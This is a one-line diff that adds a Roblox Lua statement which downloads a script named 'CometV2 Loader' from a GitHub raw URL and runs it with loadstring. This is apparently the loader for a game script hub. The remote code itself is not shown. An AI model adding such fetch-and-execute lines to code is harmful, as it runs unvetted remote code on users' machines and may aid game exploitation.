@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ln3242/CometV2/main/Loader.lua"))()
